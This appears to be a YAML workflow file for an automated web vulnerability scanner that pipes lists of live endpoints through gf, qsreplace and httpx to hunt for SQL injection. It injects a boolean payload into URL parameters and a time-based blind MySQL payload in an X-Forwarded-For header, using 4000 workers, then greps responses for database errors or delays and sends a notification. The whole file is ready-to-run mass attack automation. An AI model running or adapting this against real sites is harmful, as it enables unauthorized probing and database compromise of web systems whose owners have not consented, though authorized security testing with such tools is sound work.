vars:
  OUTPUT_ALIVE_ENDPOINTS: "aliveEndpoints"
  WORKERS: "4000"
  HTTPX_RATE_LIMIT: "300"
  OUTPUT_SQL_SINTAX_ERROR: "sqlSyntaxError"
  OUTPUT_HTTPX_SQLI_SLEEP: "sqliSleep"
  
parallel: false
modules:
  - name: SQLI HTTPX
    cmds:
      - cat {{OUTPUT_ALIVE_ENDPOINTS}} | gf sqli | grep "=" | qsreplace "' OR '1" | httpx -silent -store-response-dir output -t {{WORKERS}} -rl {{HTTPX_RATE_LIMIT}} | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" >> {{OUTPUT_SQL_SINTAX_ERROR}}
      - cat {{OUTPUT_ALIVE_ENDPOINTS}} | httpx -silent -H "X-Forwarded-For:'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13' | tee {{OUTPUT_HTTPX_SQLI_SLEEP}}

    silent: true  
    
  - name: Sending Notification
    cmds:
      - echo "SQLI - HTTPX Finished" | notify
    silent: true